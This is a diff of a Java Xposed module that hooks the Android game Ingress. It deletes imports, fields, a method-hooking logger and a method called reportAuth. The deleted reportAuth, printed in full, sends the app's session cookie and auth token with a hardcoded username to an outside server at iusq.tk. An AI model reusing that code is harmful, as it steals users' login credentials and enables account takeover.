@@ -4,23 +4,11 @@ import android.app.AndroidAppHelper;
 import android.content.Context;
 import de.robv.android.xposed.XC_MethodHook;
 import de.robv.android.xposed.XSharedPreferences;
-import de.robv.android.xposed.XposedBridge;
-import de.robv.android.xposed.XposedHelpers;
 import de.robv.android.xposed.callbacks.XC_LoadPackage;
-import org.apache.http.HttpResponse;
-import org.apache.http.NameValuePair;
-import org.apache.http.client.HttpClient;
-import org.apache.http.client.entity.UrlEncodedFormEntity;
-import org.apache.http.client.methods.HttpPost;
-import org.apache.http.impl.client.DefaultHttpClient;
-import org.apache.http.message.BasicNameValuePair;
 import org.json.JSONArray;
-import org.json.JSONException;
 import org.json.JSONObject;
 
 import java.io.*;
-import java.lang.reflect.Field;
-import java.lang.reflect.Method;
 import java.net.URI;
 import java.util.*;
 import java.util.regex.Pattern;
@@ -30,26 +18,11 @@ import static de.robv.android.xposed.XposedHelpers.*;
 
 public class Ingress extends DefaultAbstractApp {
 
-    static String cachedCookie, cachedToken;
-    Loggable logger;
-    XSharedPreferences pref;
-    boolean debug;
-    static String depthKey = "xtst-depth";
-
-    public String getName() {
-        return "Ingress";
-    }
-
     public void prepare(final XC_LoadPackage.LoadPackageParam lpparam) {
-        this.pref = new XSharedPreferences("com.example.xposedtesting", "user_settings");
-        this.debug = pref.getBoolean("debug", false);
-        this.logger = new Loggable(debug);
-
         if (!pref.getBoolean("enabled", false)) {
             logger.log("Ingress: disabled, not hooking...");
             return;
         }
-        Context context = (Context) AndroidAppHelper.currentApplication();
 
         logger.log("Preparing Ingress: hookBadlogicCameraView");
         hookBadlogicCameraView(lpparam);
@@ -592,164 +565,6 @@ public class Ingress extends DefaultAbstractApp {
 
         } catch (Throwable e) {
             logger.log("EXCEPTION in IngressScanner: " + e.getMessage() + ", " + e.getClass().toString());
-        }
-    }
-
-    private void hookAllMethods(Class<?> clazz) {
-        String clazzName = clazz.toString();
-        logger.log("Preparing hooks for " + clazzName);
-        for (Method m : clazz.getMethods()) {
-            String methodName = m.getName();
-            Class<?>[] types = getParameterTypes(m);
-            Class<?> declaringClass = m.getDeclaringClass();
-            if (declaringClass.equals(Object.class)) {
-
-                continue;
-            }
-            try {
-                logger.log("[H] would hook method `" + m.getName() + "` of " + declaringClass.toString());
-                XposedBridge.hookMethod(m, new XC_MethodHook() {
-                    @Override
-                    protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                        String thisClass = param.thisObject.getClass().toString();
-                        String methodName = param.method.getName();
-                        if (param.args == null) {
-                            logger.log("[M] " + thisClass + ", method: `" + methodName + "`, arguments (0)");
-
-                            return;
-                        }
-                        logger.log("[M] " + thisClass + ", method: `" + methodName + "`, arguments (" + param.args.length + ")");
-                    }
-                });
-/*
-switch (types.length) {
-                    case 0:
-                        findAndHookMethod(declaringClass, methodName, new XC_MethodHook() {
-                            @Override
-                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                                String hookedClass = param.thisObject.getClass().toString();
-                                String methodName = param.method.getName();
-                                String argClasses = "";
-                                for (Object argClass : param.args) {
-                                    argClasses += argClass.toString() + " ";
-                                }
-                                logger.log("[M:0] `" + hookedClass + "`, method: `" + methodName + "`, arguments: `" + argClasses + "`");
-                            }
-                        });
-                        break;
-                    case 1:
-                        findAndHookMethod(declaringClass, methodName, types[0], new XC_MethodHook() {
-                            @Override
-                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                                String hookedClass = param.thisObject.getClass().toString();
-                                String methodName = param.method.getName();
-                                String argClasses = "";
-                                for (Object argClass : param.args) {
-                                    argClasses += argClass.toString() + " ";
-                                }
-                                logger.log("[M:1] `" + hookedClass + "`, method: `" + methodName + "`, arguments: `" + argClasses + "`");
-                            }
-                        });
-                        break;
-                    case 2:
-                        findAndHookMethod(declaringClass, methodName, types[0], types[1], new XC_MethodHook() {
-                            @Override
-                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                                String hookedClass = param.thisObject.getClass().toString();
-                                String methodName = param.method.getName();
-                                String argClasses = "";
-                                for (Object argClass : param.args) {
-                                    argClasses += argClass.toString() + " ";
-                                }
-                                logger.log("[M:2] `" + hookedClass + "`, method: `" + methodName + "`, arguments: `" + argClasses + "`");
-                            }
-                        });
-                        break;
-                    case 3:
-                        findAndHookMethod(declaringClass, methodName, types[0], types[1], types[2], new XC_MethodHook() {
-                            @Override
-                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                                String hookedClass = param.thisObject.getClass().toString();
-                                String methodName = param.method.getName();
-                                String argClasses = "";
-                                for (Object argClass : param.args) {
-                                    argClasses += argClass.toString() + " ";
-                                }
-                                logger.log("[M:3] `" + hookedClass + "`, method: `" + methodName + "`, arguments: `" + argClasses + "`");
-                            }
-                        });
-                        break;
-                    case 4:
-                        findAndHookMethod(declaringClass, methodName, types[0], types[1], types[2], types[3], new XC_MethodHook() {
-                            @Override
-                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                                String hookedClass = param.thisObject.getClass().toString();
-                                String methodName = param.method.getName();
-                                String argClasses = "";
-                                for (Object argClass : param.args) {
-                                    argClasses += argClass.toString() + " ";
-                                }
-                                logger.log("[M:4] `" + hookedClass + "`, method: `" + methodName + "`, arguments: `" + argClasses + "`");
-                            }
-                        });
-                        break;
-                    case 5:
-                        findAndHookMethod(declaringClass, methodName, types[0], types[1], types[2], types[3], types[4], new XC_MethodHook() {
-                            @Override
-                            protected void beforeHookedMethod(MethodHookParam param) throws Throwable {
-                                String hookedClass = param.thisObject.getClass().toString();
-                                String methodName = param.method.getName();
-                                String argClasses = "";
-                                for (Object argClass : param.args) {
-                                    argClasses += argClass.toString() + " ";
-                                }
-                                logger.log("[M:5] `" + hookedClass + "`, method: `" + methodName + "`, arguments: `" + argClasses + "`");
-                            }
-                        });
-                        break;
-                    default:
-                        logger.log("Not hooked method `" + methodName + "` for `" + clazzName + "`");
-                }
-*/
-            } catch (Throwable e) {
-                logger.log("Faied hookig method " + methodName + " for " + clazzName + ": " + e.getMessage());
-            }
-        }
-
-    }
-
-    private void reportAuth(String cookie, String token) throws UnsupportedEncodingException, JSONException {
-        if (cachedCookie != null && cachedToken != null) {
-            if (cachedCookie.equals(cookie) && cachedToken.equals(token)) {
-                logger.debugLog("auth: already sent");
-
-                return;
-            }
-        }
-        HttpClient client = new DefaultHttpClient();
-        HttpPost fakeRequest = new HttpPost("http://iusq.tk/i/ing-auth.php");
-        List<NameValuePair> urlParameters = new ArrayList<NameValuePair>();
-        urlParameters.add(new BasicNameValuePair("user", "appleblo0m"));
-        urlParameters.add(new BasicNameValuePair("cookie", cookie));
-        urlParameters.add(new BasicNameValuePair("token", token));
-
-        fakeRequest.setEntity(new UrlEncodedFormEntity(urlParameters));
-        logger.debugLog("auth: reporting...");
-        try {
-            HttpResponse fakeResponse = client.execute(fakeRequest);
-            fakeResponse.getEntity().getContent().close();
-        } catch (Throwable e) {
-            logger.log("auth: report ERROR: " + e.getClass().toString() + ", " + e.getMessage());
-
-            return;
-        }
-        cachedCookie = cookie;
-        cachedToken = token;
-    }
-
-    private void printStackTrace() {
-        for (StackTraceElement ste : new Throwable().getStackTrace()) {
-            logger.log("[TRACE] " + ste);
         }
     }
 }
